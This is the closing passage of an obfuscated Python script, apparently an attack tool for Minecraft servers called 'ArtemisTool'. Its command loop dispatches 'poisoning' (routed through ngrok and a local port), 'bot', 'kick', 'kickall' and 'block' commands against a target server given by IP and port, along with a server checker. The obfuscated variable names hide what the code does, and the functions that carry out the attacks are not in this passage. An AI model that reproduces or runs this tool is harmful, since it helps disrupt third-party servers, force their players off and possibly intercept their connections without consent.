                    print (f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")#line:1156
            except IndexError :#line:1158
                print (f"\n{white}     Usage: checker [file]")#line:1159
            except Exception as OOOO00O0OO0O0OO0O :#line:1161
                if DEBUG :#line:1162
                    print (f"     [DEBUG] Exception (Checker): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1163
        elif O000OO00000O000O0 .lower ()=="bungee":#line:1165
            try :#line:1166
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1167
                O0O00O0OOOOO0O00O =check_java ()#line:1168
                if O0O00O0OOOOO0O00O :#line:1170
                    bungee_command (O0O0O0OOO0O0O0OOO )#line:1171
            except IndexError :#line:1173
                print (f"\n{white}     Usage: bungee [ip:port]")#line:1174
            except Exception as OOOO00O0OO0O0OO0O :#line:1176
                if DEBUG :#line:1177
                    print (f"     [DEBUG] Exception (Bungee): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1178
        elif O000OO00000O000O0 .lower ()=="poisoning"or O000OO00000O000O0 .lower ()=="poisoning":#line:1180
            try :#line:1181
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1182
                OO0000O00O00O0000 =OO0O0O0000O00O0O0 [2 ]#line:1183
                O0O00O0OOOOO0O00O =check_java ()#line:1184
                if O0O00O0OOOOO0O00O :#line:1186
                    OOO00O0000OOOOOOO =check_ngrok (OO0000O00O00O0000 )#line:1187
                    if OOO00O0000OOOOOOO [0 ]:#line:1188
                        O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1189
                        if O0O00O00O00OO00OO :#line:1190
                            OOO000O0O000000O0 =check_port (OO0000O00O00O0000 )#line:1191
                            if OOO000O0O000000O0 :#line:1192
                                poisoning_command (O0O0O0OOO0O0O0OOO ,OO0000O00O00O0000 ,OOO00O0000OOOOOOO [1 ])#line:1193
            except IndexError :#line:1195
                print (f"\n{white}     Usage: poisoning [ip:port] [local-port]")#line:1196
            except Exception as OOOO00O0OO0O0OO0O :#line:1198
                if DEBUG :#line:1199
                    print (f"     [DEBUG] Exception (Poisoning): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1200
        elif O000OO00000O000O0 .lower ()=="bot"or O000OO00000O000O0 .lower ()=="connect":#line:1202
            try :#line:1203
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1204
                O0O00OO0O0OO0O0OO =check_node ()#line:1205
                if O0O00OO0O0OO0O0OO :#line:1207
                    O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1208
                    if O0O00O00O00OO00OO :#line:1209
                        OO0OOO0O00OOO00O0 =get_port (O0O0O0OOO0O0O0OOO )#line:1210
                        OOO00OOO0OOO0O0O0 =specific_version ()#line:1211
                        OO0OO0000OO00O000 =specific_name ()#line:1212
                        if ":"in O0O0O0OOO0O0O0OOO :#line:1214
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO .split (":")#line:1215
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO [0 ]#line:1216
                        connect ("connect",O0O0O0OOO0O0O0OOO ,OO0OOO0O00OOO00O0 ,OOO00OOO0OOO0O0O0 ,OO0OO0000OO00O000 )#line:1218
                        os .system ("cls || clear")#line:1219
                        print (banner )#line:1220
            except IndexError :#line:1222
                print (f"\n{white}     Usage: bot [server]")#line:1223
            except KeyboardInterrupt :#line:1225
                print (f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:1226
                time .sleep (2 )#line:1227
                os .system ("cls || clear")#line:1228
                print (banner )#line:1229
            except Exception as OOOO00O0OO0O0OO0O :#line:1231
                if DEBUG :#line:1232
                    print (f"     [DEBUG] Exception (Bot): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1233
        elif O000OO00000O000O0 .lower ()=="kick":#line:1235
            try :#line:1236
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1237
                OOO00OOO0OOO0O0O0 =OO0O0O0000O00O0O0 [2 ]#line:1238
                OO0OO0000OO00O000 =OO0O0O0000O00O0O0 [3 ]#line:1239
                O0O00OO0O0OO0O0OO =check_node ()#line:1240
                if O0O00OO0O0OO0O0OO :#line:1242
                    O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1243
                    if O0O00O00O00OO00OO :#line:1244
                        OO0OOO0O00OOO00O0 =get_port (O0O0O0OOO0O0O0OOO )#line:1245
                        if ":"in O0O0O0OOO0O0O0OOO :#line:1247
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO .split (":")#line:1248
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO [0 ]#line:1249
                        connect ("kick",O0O0O0OOO0O0O0OOO ,OO0OOO0O00OOO00O0 ,OOO00OOO0OOO0O0O0 ,OO0OO0000OO00O000 )#line:1251
            except IndexError :#line:1253
                print (f"\n{white}     Usage: kick [ip:port] [version] [name]")#line:1254
            except KeyboardInterrupt :#line:1256
                print (f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:1257
            except Exception as OOOO00O0OO0O0OO0O :#line:1259
                if DEBUG :#line:1260
                    print (f"     [DEBUG] Exception (Kick): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1261
        elif O000OO00000O000O0 .lower ()=="kickall":#line:1263
            try :#line:1264
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1265
                OOO00OOO0OOO0O0O0 =OO0O0O0000O00O0O0 [2 ]#line:1266
                O0O00OO0O0OO0O0OO =check_node ()#line:1267
                if O0O00OO0O0OO0O0OO :#line:1269
                    O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1270
                    if O0O00O00O00OO00OO :#line:1271
                        OO0OOO0O00OOO00O0 =get_port (O0O0O0OOO0O0O0OOO )#line:1272
                        if ":"in O0O0O0OOO0O0O0OOO :#line:1274
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO .split (":")#line:1275
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO [0 ]#line:1276
                        connect ("kickall",O0O0O0OOO0O0O0OOO ,OO0OOO0O00OOO00O0 ,OOO00OOO0OOO0O0O0 ,None )#line:1278
            except IndexError :#line:1280
                print (f"\n{white}     Usage: kickall [ip:port] [version]")#line:1281
            except KeyboardInterrupt :#line:1283
                print (f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:1284
            except Exception as OOOO00O0OO0O0OO0O :#line:1286
                if DEBUG :#line:1287
                    print (f"     [DEBUG] Exception (Kickall): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1288
        elif O000OO00000O000O0 .lower ()=="block":#line:1290
            try :#line:1291
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1292
                OOO00OOO0OOO0O0O0 =OO0O0O0000O00O0O0 [2 ]#line:1293
                OO0OO0000OO00O000 =OO0O0O0000O00O0O0 [3 ]#line:1294
                O0O00OO0O0OO0O0OO =check_node ()#line:1295
                if O0O00OO0O0OO0O0OO :#line:1297
                    O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1298
                    if O0O00O00O00OO00OO :#line:1299
                        OO0OOO0O00OOO00O0 =get_port (O0O0O0OOO0O0O0OOO )#line:1300
                        if ":"in O0O0O0OOO0O0O0OOO :#line:1302
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO .split (":")#line:1303
                            O0O0O0OOO0O0O0OOO =O0O0O0OOO0O0O0OOO [0 ]#line:1304
                        connect ("block",O0O0O0OOO0O0O0OOO ,OO0OOO0O00OOO00O0 ,OOO00OOO0OOO0O0O0 ,OO0OO0000OO00O000 )#line:1306
            except IndexError :#line:1308
                print (f"\n{white}     Usage: block [ip:port] [version] [name]")#line:1309
            except KeyboardInterrupt :#line:1311
                print (f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:1312
            except Exception as OOOO00O0OO0O0OO0O :#line:1314
                if DEBUG :#line:1315
                    print (f"     [DEBUG] Exception (Block): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1316
        elif O000OO00000O000O0 .lower ()=="discord"or O000OO00000O000O0 .lower ()=="ds":#line:1318
            print (f"\n     {white}My Discord server: {lcyan}{discord_link}{reset}")#line:1319
        else :#line:1321
            print (f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")#line:1322
    except KeyboardInterrupt :#line:1324
        print (f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:1325
    except :#line:1327
        pass #line:1328
if __name__ =="__main__":#line:1331
    os .system ("clear || cls & title ArtemisTool by Nowze'#0001")#line:1332
    if not SKIP_LOAD :#line:1334
        load ()#line:1335
    os .system ("clear || cls ")#line:1337
    print (banner )#line:1338
    while True :#line:1339
        if os .name =="nt":#line:1340
            py ="python"#line:1341
            print (f"\n {reset}{red}    root@windows:~/ArtemisTool# {lblack}» {white} ",end ="")#line:1342
            main ()#line:1343
        else :#line:1345
            py ="python3"#line:1346
            print (f"\n {reset}{red}    root@linux:~/ArtemisTool# {lblack}» {white} ",end ="")#line:1347
            main ()#line:1348
